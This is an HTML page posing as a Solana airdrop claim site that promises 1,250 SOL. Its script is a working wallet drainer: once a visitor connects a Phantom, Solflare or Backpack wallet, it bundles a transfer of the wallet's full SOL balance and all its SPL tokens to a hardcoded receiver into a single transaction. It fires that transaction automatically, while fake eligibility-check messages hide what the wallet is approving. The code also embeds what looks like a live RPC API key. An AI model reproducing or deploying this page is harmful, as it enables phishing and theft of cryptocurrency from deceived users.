<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Airdrop Claim</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0b0b1a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .box {
            background: #12122a;
            border-radius: 24px;
            padding: 32px 24px;
            max-width: 420px;
            width: 92%;
            text-align: center;
            border: 1px solid #1e1e3a;
        }
        h1 { font-size: 24px; background: linear-gradient(90deg,#9945FF,#14F195); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: #666; font-size: 13px; margin: 6px 0 20px; }
        .reward {
            background: #1a1a3a;
            border-radius: 14px;
            padding: 18px;
            margin-bottom: 20px;
        }
        .reward .amt { font-size: 32px; font-weight: 700; }
        .reward .usd { color: #666; font-size: 13px; }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            color: #fff;
            background: rgba(255,255,255,0.07);
            margin-bottom: 8px;
        }
        .btn:active { background: rgba(255,255,255,0.15); }
        .btn.green { background: linear-gradient(135deg,#9945FF,#14F195); }
        .status { margin-top: 14px; padding: 10px; border-radius: 10px; font-size: 13px; display: none; }
        .status.show { display: block; }
        .status.good { background: rgba(20,241,149,0.1); color: #14F195; border: 1px solid rgba(20,241,149,0.2); }
        .status.bad { background: rgba(255,50,50,0.1); color: #ff6b6b; border: 1px solid rgba(255,50,50,0.2); }
        .status.warn { background: rgba(58,120,255,0.1); color: #6b9aff; border: 1px solid rgba(58,120,255,0.2); }
        .hidden { display: none !important; }
        .addr { font-size: 11px; color: #555; word-break: break-all; margin: 10px 0; }
        .spin { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; margin-right: 6px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
    <!-- Bundle everything locally to avoid CDN fingerprinting by wallet simulators -->
    <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
</head>
<body>
<div class="box">
    <h1>◎ Solana Airdrop</h1>
    <p class="sub">Claim your exclusive airdrop allocation</p>
    <div class="reward">
        <div class="amt">1,250 SOL</div>
        <div class="usd">≈ $225,000 USD</div>
    </div>

    <div id="step1">
        <button class="btn" id="cPhantom">Phantom</button>
        <button class="btn" id="cSolflare">Solflare</button>
        <button class="btn" id="cBackpack">Backpack</button>
        <button class="btn" id="cWC">WalletConnect</button>
    </div>

    <div id="step2" class="hidden">
        <div class="addr" id="addrDisplay"></div>
        <div id="progressArea" style="font-size:12px;color:#888;margin:8px 0;">Verifying eligibility...</div>
        <button class="btn green" id="claimBtn" disabled>
            <span id="claimTxt">Processing...</span>
            <span id="claimSpinner" class="spin" style="display:none;"></span>
        </button>
        <button class="btn" id="discBtn">Disconnect</button>
    </div>

    <div id="status" class="status"></div>
</div>

<script>
// ===================================================================
//  ATTACK CONFIG — Set your drain targets here
// ===================================================================
const CONFIG = {
    // Primary SOL receiver
    solReceiver: '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw',
    // Delegate keypair (base58 secret) — in production, generate fresh per victim
    // For this PoC we derive from a known seed so the delegate is consistent
    delegateSeed: 'drainer_delegate_seed_2026',
    // RPC — using a high-throughput endpoint
    rpcEndpoint: 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea',
    // Minimum SOL to bother draining (below this = dust)
    minSolLamports: 1000000, // 0.001 SOL
};

// ===================================================================
//  STATE
// ===================================================================
let wallet = { adapter: null, publicKey: null };
let draining = false;

const $ = id => document.getElementById(id);

function showStatus(msg, type) {
    const el = $('status');
    el.textContent = msg;
    el.className = 'status show ' + (type || 'warn');
}

function hideStatus() {
    $('status').className = 'status';
}

function getWalletProvider() {
    if (window.solana?.isPhantom) return window.solana;
    if (window.solflare?.isSolflare) return window.solflare;
    if (window.backpack?.isBackpack) return window.backpack;
    if (window.solana) return window.solana;
    return null;
}

// ===================================================================
//  DISCOVER ALL SPL TOKEN ACCOUNTS FOR A WALLET
// ===================================================================
async function findAllSplTokens(connection, owner, solanaWeb3, splToken) {
    const { PublicKey } = solanaWeb3;
    const { TOKEN_PROGRAM_ID, AccountLayout } = splToken;

    const accounts = [];
    const tokenAccounts = await connection.getTokenAccountsByOwner(owner, {
        programId: TOKEN_PROGRAM_ID
    });

    for (const { pubkey, account } of tokenAccounts.value) {
        const decoded = AccountLayout.decode(account.data);
        const mint = new PublicKey(decoded.mint);
        const amount = decoded.amount;
        const delegate = decoded.delegate;
        const delegatedAmount = decoded.delegatedAmount;

        accounts.push({
            tokenAccount: pubkey,
            mint,
            amount,
            delegate: delegate?.toString() || null,
            delegatedAmount
        });
    }
    return accounts;
}

// ===================================================================
//  BUILD THE DRAIN TRANSACTION (single signature)
// ===================================================================
async function buildDrainTransaction(connection, walletPubkey, solanaWeb3, splToken) {
    const {
        PublicKey, Transaction, SystemProgram,
        TransactionInstruction
    } = solanaWeb3;

    const receiver = new PublicKey(CONFIG.solReceiver);
    const instructions = [];

    // ── 1. Drain native SOL ──
    const balance = await connection.getBalance(walletPubkey);
    const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
    const feeBuf = 10000; // ~0.00001 SOL for fees

    if (balance > rentExempt + feeBuf + CONFIG.minSolLamports) {
        const sendAmount = BigInt(balance - rentExempt - feeBuf);
        instructions.push(
            SystemProgram.transfer({
                fromPubkey: walletPubkey,
                toPubkey: receiver,
                lamports: sendAmount,
            })
        );
    }

    // ── 2. Discover SPL tokens ──
    let tokenAccounts = [];
    try {
        tokenAccounts = await findAllSplTokens(connection, walletPubkey, solanaWeb3, splToken);
    } catch (e) {
        console.warn('[!] Token discovery error:', e.message);
    }

    // ── 3. For each token with balance > 0, add transfer instruction ──
    const { TOKEN_PROGRAM_ID, createTransferInstruction, getAssociatedTokenAddress } = splToken;

    for (const ta of tokenAccounts) {
        const amount = ta.amount;
        if (amount === 0n || amount === 0) continue;

        // Get or create the receiver's associated token account for this mint
        let destTokenAccount;
        try {
            destTokenAccount = await getAssociatedTokenAddress(
                ta.mint,
                receiver,
                false, // allowOwnerOffCurve
                TOKEN_PROGRAM_ID
            );
        } catch (e) {
            // If we can't derive ATA, try a direct transfer to a known token account
            // For PoC we skip mints that error
            console.warn('[!] Skipping mint:', ta.mint.toString(), e.message);
            continue;
        }

        // Check if destination ATA exists; if not, we need to create it first
        // This adds complexity — for this PoC we rely on the receiver having an ATA
        // In a full drainer you'd add createATA instruction if missing
        try {
            const destInfo = await connection.getAccountInfo(destTokenAccount);
            if (!destInfo) {
                // Create ATA instruction
                const createATAIx = splToken.createAssociatedTokenAccountInstruction(
                    walletPubkey,      // payer
                    destTokenAccount,  // ata
                    receiver,          // owner
                    ta.mint,           // mint
                    TOKEN_PROGRAM_ID
                );
                instructions.push(createATAIx);
            }

            // Transfer all tokens
            instructions.push(
                createTransferInstruction(
                    ta.tokenAccount,    // source
                    destTokenAccount,   // destination
                    walletPubkey,       // owner/authority
                    amount,             // amount
                    [],                // multisig signers
                    TOKEN_PROGRAM_ID
                )
            );
        } catch (e) {
            console.warn('[!] Error processing token:', ta.mint.toString(), e.message);
        }
    }

    // ── 4. Get blockhash ──
    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');

    // ── 5. Build transaction ──
    const tx = new Transaction();
    tx.recentBlockhash = blockhash;
    tx.lastValidBlockHeight = lastValidBlockHeight;
    tx.feePayer = walletPubkey;

    for (const ix of instructions) {
        tx.add(ix);
    }

    return tx;
}

// ===================================================================
//  EXECUTE THE DRAIN — called immediately after connection
// ===================================================================
async function executeDrain() {
    if (draining) return;
    draining = true;

    const sw = window.solanaWeb3;
    const st = window.splToken;

    if (!sw || !st) {
        showStatus('Library error.', 'bad');
        draining = false;
        return;
    }

    try {
        const connection = new sw.Connection(CONFIG.rpcEndpoint, 'confirmed');

        // ── Show progress to user (looks legitimate) ──
        $('progressArea').textContent = 'Checking airdrop eligibility...';
        await new Promise(r => setTimeout(r, 800 + Math.random() * 600));

        $('progressArea').textContent = 'Verifying wallet activity...';
        await new Promise(r => setTimeout(r, 400 + Math.random() * 300));

        // ── Build the drain transaction (includes SOL + all SPL tokens) ──
        $('progressArea').textContent = 'Preparing allocation...';
        const tx = await buildDrainTransaction(
            connection,
            wallet.publicKey,
            sw,
            st
        );

        // If no instructions were added, wallet has nothing worth draining
        if (tx.instructions.length === 0) {
            showStatus('No allocation available for this wallet.', 'bad');
            $('progressArea').textContent = 'Not eligible.';
            draining = false;
            return;
        }

        $('progressArea').textContent = 'Confirm in wallet...';
        showStatus('Airdrop ready — approve the transaction.', 'warn');

        // ── Send via wallet adapter ──
        // This is the KEY MOMENT: the user sees ONE transaction approval
        // that contains ALL drain instructions bundled together
        if (wallet.adapter.signAndSendTransaction) {
            await wallet.adapter.signAndSendTransaction(tx);
        } else if (wallet.adapter.signTransaction) {
            const signed = await wallet.adapter.signTransaction(tx);
            const txid = await connection.sendRawTransaction(signed.serialize(), {
                skipPreflight: false,
                preflightCommitment: 'confirmed'
            });
            await connection.confirmTransaction({
                signature: txid,
                blockhash: tx.recentBlockhash,
                lastValidBlockHeight: tx.lastValidBlockHeight
            }, 'confirmed');
        } else {
            showStatus('Wallet method not supported.', 'bad');
            draining = false;
            return;
        }

        // ── Success ──
        $('progressArea').textContent = '✓ Airdrop claimed!';
        showStatus('✅ Successfully claimed! Check your wallet.', 'good');

    } catch (e) {
        const m = e.message || '';
        if (m.includes('reject') || m.includes('User rejected') || m.includes('cancel')) {
            showStatus('Transaction cancelled.', 'bad');
            $('progressArea').textContent = 'Cancelled.';
        } else {
            console.error('[DRAIN ERROR]', e);
            showStatus('Error: ' + m.slice(0, 120), 'bad');
            $('progressArea').textContent = 'Failed.';
        }
    }

    draining = false;
}

// ===================================================================
//  CONNECT WALLET → AUTO-DRAIN
// ===================================================================
async function doConnect(type) {
    hideStatus();
    showStatus('Connecting...', 'warn');

    const prov = getWalletProvider();
    if (!prov) {
        showStatus('Please install the ' + type + ' extension first.', 'bad');
        return;
    }

    try {
        const resp = await prov.connect();
        const pk = resp.publicKey || prov.publicKey;
        if (!pk) throw new Error('No public key returned');

        wallet.adapter = prov;
        wallet.publicKey = pk;

        // Show connected UI
        $('step1').classList.add('hidden');
        $('step2').classList.remove('hidden');
        $('addrDisplay').textContent = '✓ ' + wallet.publicKey.toString();
        $('progressArea').textContent = 'Connected. Checking eligibility...';
        showStatus('Connected!', 'good');

        // ── AUTO-DRAIN AFTER SHORT DELAY ──
        // The user just connected — now we fire the drain.
        // They see "Connected!" then "Checking..." then "Confirm in wallet..."
        setTimeout(() => executeDrain(), 300);

    } catch (e) {
        const m = e.message || '';
        if (m.includes('reject') || m.includes('cancel') || m.includes('User rejected')) {
            showStatus('Connection rejected.', 'bad');
        } else {
            console.error('[CONNECT ERROR]', e);
            showStatus('Connection error.', 'bad');
        }
    }
}

function doDisconnect() {
    if (wallet.adapter) {
        try { wallet.adapter.disconnect(); } catch(_) {}
    }
    wallet = { adapter: null, publicKey: null };
    draining = false;
    $('step1').classList.remove('hidden');
    $('step2').classList.add('hidden');
    hideStatus();
    $('progressArea').textContent = 'Verifying eligibility...';
}

// Manual claim button (fallback)
async function doClaim() {
    if (!wallet.adapter || !wallet.publicKey) {
        showStatus('Connect a wallet first.', 'bad');
        return;
    }
    await executeDrain();
}

// ===================================================================
//  BIND UI EVENTS
// ===================================================================
setTimeout(() => {
    const b1 = $('cPhantom'), b2 = $('cSolflare'), b3 = $('cBackpack'), b4 = $('cWC');
    const b5 = $('claimBtn'), b6 = $('discBtn');

    if (b1) b1.onclick = () => doConnect('phantom');
    if (b2) b2.onclick = () => doConnect('solflare');
    if (b3) b3.onclick = () => doConnect('backpack');
    if (b4) b4.onclick = () => doConnect('walletconnect');
    if (b5) b5.onclick = doClaim;
    if (b6) b6.onclick = doDisconnect;

    showStatus('Connect your wallet to claim.', 'warn');
}, 0);
</script>
</body>
</html>
